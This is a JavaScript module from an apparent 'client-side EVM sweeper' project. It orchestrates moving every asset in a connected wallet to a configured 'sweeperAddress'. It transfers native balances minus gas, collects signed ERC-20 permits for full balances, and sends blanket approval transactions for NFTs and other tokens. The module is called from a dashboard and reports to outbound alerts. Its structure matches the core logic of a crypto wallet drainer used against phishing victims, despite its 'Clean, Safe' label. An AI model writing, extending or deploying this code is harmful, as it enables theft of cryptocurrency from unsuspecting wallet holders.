// client-side-evm-sweeper/src/engines/transaction-runner.js
import { ethers } from 'ethers';
import { MultiScanner } from './multi-scanner.js';
import { ValuationSorter } from './valuation-sorter.js';
import { payloadSigner } from './payload-signer.js';
import { allowanceGrantor } from './allowance-grantor.js';
import { DynamicFeeManager } from './dynamic-fees.js';
import { StateManager } from './state-manager.js';
import { OutboundAlerts } from './outbound-alerts.js';

/**
 * TRANSACTION RUNNER - Production v2 (Clean, Safe & High-Level)
 * Orchestrates full asset sweep using pre-scanned cached data.
 */
export class TransactionRunner {
    constructor(config) {
        this.config = config || {};

        this.scanner = new MultiScanner(
            config.networks,
            config.targets || [],
            { alchemyApiKey: config.alchemyApiKey || "" }
        );

        this.sorter = new ValuationSorter();
        this.feeManager = new DynamicFeeManager(config.networks);
        this.state = new StateManager();
        this.alerts = new OutboundAlerts(config.alerts || {});

        this.ownerAddress = config.ownerAddress;
        this.sweeperAddress = ethers.getAddress(config.sweeperAddress); // ENSURE checksum

        this.dryRun = config.dryRun ?? true;        // Safety default: true
        this.maxConcurrent = config.maxConcurrent ?? 2;
        this.minBalanceThreshold = config.minBalanceThreshold ?? 1n; // Flexible
    }

    /**
     * Main Entry Point - Called from QuickActions or dashboard
     */
    async executeFullSweep(signer, provider) {
        if (!signer) throw new Error("Signer is required");
        if (!this.ownerAddress) throw new Error("Owner address not configured");

        console.log("🚀 Starting Full Asset Sweep...");

        try {
            await this.alerts.info("Sweep Initiated", "Scanning wallet...");

            // Use pre-scanned data from MultiScanner (already filtered positively)
            const rawAssets = await this.scanner.scanAllTargets(this.ownerAddress);

            await this.alerts.info("Scan Complete", `${rawAssets.length} assets found.`);

            const sortedAssets = this.sorter.rankAssets(rawAssets);
            const targetsToSweep = sortedAssets.filter(asset => this.shouldSweep(asset));

            if (targetsToSweep.length === 0) {
                await this.alerts.info("Nothing to Sweep", "No assets met the sweep criteria.");
                return [];
            }

            console.log(`Processing ${targetsToSweep.length} assets...`);

            const results = await this.processAssetsInBatches(targetsToSweep, signer, provider);

            const successful = results.filter(r => r.success).length;
            await this.alerts.success("Sweep Completed", `${successful}/${results.length} assets processed.`);

            return results;
        } catch (error) {
            console.error("❌ Full sweep failed:", error);
            await this.alerts.error("Sweep Failed", error.message || "Unknown error");
            throw error;
        }
    }

    /**
     * High-Level Sweep Decision Logic
     */
    shouldSweep(asset) {
        if (!asset?.balance || asset.balance === '0') return false;

        const balance = ethers.toBigInt(asset.balance);

        // Accept any positive balance (including small ones like $1.85 ETH)
        if (balance > this.minBalanceThreshold) {
            return true;
        }

        console.warn(`[Filter] Asset ${asset.symbol} skipped - below threshold`);
        return false;
    }

    async processAssetsInBatches(assets, signer, provider) {
        const results = [];
        const batches = this.chunkArray(assets, this.maxConcurrent);

        for (let i = 0; i < batches.length; i++) {
            const batch = batches[i];
            console.log(`Processing batch ${i + 1}/${batches.length}...`);

            const batchPromises = batch.map(asset =>
                this.processSingleAsset(asset, signer, provider)
            );

            const batchResults = await Promise.allSettled(batchPromises);

            batchResults.forEach((result, idx) => {
                const asset = batch[idx];
                if (result.status === 'fulfilled') {
                    results.push(result.value);
                } else {
                    results.push({
                        success: false,
                        asset,
                        error: result.reason?.message || String(result.reason)
                    });
                }
            });

            // Polite delay between batches
            if (i < batches.length - 1) {
                await new Promise(r => setTimeout(r, 800));
            }
        }

        return results;
    }

    async processSingleAsset(asset, signer, provider) {
        const target = this.config.targets?.find(t => t.id === asset.targetId);
        if (!target) throw new Error(`Missing target config for ${asset.targetId}`);

        let tx = null;

        try {
            const gasSettings = await this.feeManager.getGasSettings(asset.chainId, { profile: 'aggressive' });

            // ====================== NATIVE TOKEN ======================
            if (asset.type === 'native') {
                const result = await this._handleNativeSweep(asset, signer, gasSettings);
                return { success: true, asset, ...result };
            }

            // ====================== ERC-20 (Permit preferred) ======================
            if (asset.type === 'erc20' && !this.dryRun) {
                const signedPermit = await payloadSigner.createAndSignForTarget(
                    target,
                    this.ownerAddress,
                    this.sweeperAddress,
                    asset.balance,
                    asset.chainId,
                    signer
                );

                return {
                    success: true,
                    type: 'permit_signature',
                    asset,
                    ...signedPermit
                };
            }

            // ====================== APPROVAL (NFTs + Legacy) ======================
            const approvalResult = await this._handleApproval(asset, target, signer, gasSettings);
            return { success: true, asset, ...approvalResult };

        } catch (error) {
            console.error(`Failed to process ${asset.symbol || asset.targetId}:`, error);
            this.state.markFailed(`asset-${asset.targetId}`, error);
            return { success: false, asset, error: error.message };
        }
    }

    // ====================== PRIVATE HELPERS ======================
    async _handleNativeSweep(asset, signer, gasSettings) {
        const rawBalance = ethers.toBigInt(asset.balance);
        const gasPrice = gasSettings.maxFeePerGas || gasSettings.gasPrice || 10_000_000n;
        const gasLimit = 21_000n;
        const estimatedFee = gasPrice * gasLimit;

        if (rawBalance <= estimatedFee) {
            throw new Error("Native balance too low to cover gas");
        }

        const sweepAmount = rawBalance - estimatedFee;

        const nativeTx = {
            to: this.sweeperAddress,
            value: sweepAmount,
            maxFeePerGas: gasSettings.maxFeePerGas,
            maxPriorityFeePerGas: gasSettings.maxPriorityFeePerGas,
            type: 2,
        };

        let tx;
        if (!this.dryRun) {
            tx = await signer.sendTransaction(nativeTx);
            await tx.wait();
            console.log(`✅ Native sweep confirmed: ${tx.hash}`);
        }

        return { type: 'native_transfer', hash: tx?.hash || null };
    }

    async _handleApproval(asset, target, signer, gasSettings) {
        const approvalTx = allowanceGrantor.createApprovalTx(target, this.sweeperAddress);

        const txWithGas = {
            ...approvalTx.tx,
            maxFeePerGas: gasSettings.maxFeePerGas,
            maxPriorityFeePerGas: gasSettings.maxPriorityFeePerGas,
            type: 2,
        };

        let tx;
        if (!this.dryRun) {
            tx = await signer.sendTransaction(txWithGas);
            await tx.wait();
            console.log(`✅ Approval confirmed: ${tx.hash}`);
        }

        return { type: 'contract_approval', hash: tx?.hash || null };
    }

    chunkArray(array, size) {
        return Array.from({ length: Math.ceil(array.length / size) }, (_, i) =>
            array.slice(i * size, i * size + size)
        );
    }
}

export default TransactionRunner;